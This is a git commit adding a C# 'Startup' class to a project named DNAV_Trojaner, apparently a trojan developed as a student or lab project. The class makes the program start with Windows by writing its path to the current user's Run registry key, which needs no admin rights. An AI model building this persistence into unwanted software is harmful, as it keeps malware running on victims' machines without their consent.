43c0f689bc40fb05a0005f32bbb91d55d2e2ff0f
Kueppers, Niclas <niclas.kueppers@hsrw.org>
2019-11-11 16:10:44 +0100

    Klasse für den Autostart wurde hinzugefügt. Lässt sich selbst ohne Adminrechte aktivieren/deaktivieren.

---
+++ DNAV_Trojaner/Startup.cs
@@ -0,0 +1,21 @@
+﻿using Microsoft.Win32;
+using System.Windows.Forms;
+
+namespace DNAV_Trojaner
+{
+    class Startup
+    {
+        public static void Enable()
+        {
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+            key.SetValue("DNAV", Application.ExecutablePath.ToString());
+            key.Close();
+        }
+
+        public static void Disable()
+        {
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+            key.DeleteValue("DNAV", false);
+        }
+    }
+}
